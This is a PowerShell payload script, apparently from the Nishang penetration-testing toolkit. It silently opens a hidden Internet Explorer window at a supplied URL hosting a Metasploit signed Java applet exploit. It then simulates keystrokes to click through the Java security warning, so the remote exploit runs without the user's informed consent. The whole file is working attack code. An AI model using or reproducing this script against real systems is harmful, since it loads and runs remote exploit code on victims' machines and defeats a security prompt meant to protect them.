<#
.SYNOPSIS
Nishang Payload which silently browses to a URL and accepts
Java Applet Run Warning.

.DESCRIPTION
This payload browses to a URL hidden from view 
which hosts metasploit java signed applet exploit
and accepts the run warning autmoatically.

.PARAMETER URL
The URL where the exploit is hosted.

.EXAMPLE
PS > .\Browse_Accept_Applet.ps1 http://example.com

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>




Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL)
function Browse_Accept_Applet
{
$ErrorActionPreference = "SilentlyContinue"
$ie = new-object -comobject "InternetExplorer.Application" 
$ie.visible = $false 
$ie.navigate("$URL")    
start-sleep -seconds 20
[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") 
[Microsoft.VisualBasic.Interaction]::AppActivate("Warning - Security") 
[Microsoft.VisualBasic.Interaction]::AppActivate("Security Warning")
start-sleep -seconds 5
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[System.Windows.Forms.SendKeys]::SendWait(" ") 
start-sleep -seconds 2
[System.Windows.Forms.SendKeys]::SendWait("{TAB}") 
start-sleep -seconds 2
[System.Windows.Forms.SendKeys]::SendWait("{Enter}") 
}
Browse_Accept_Applet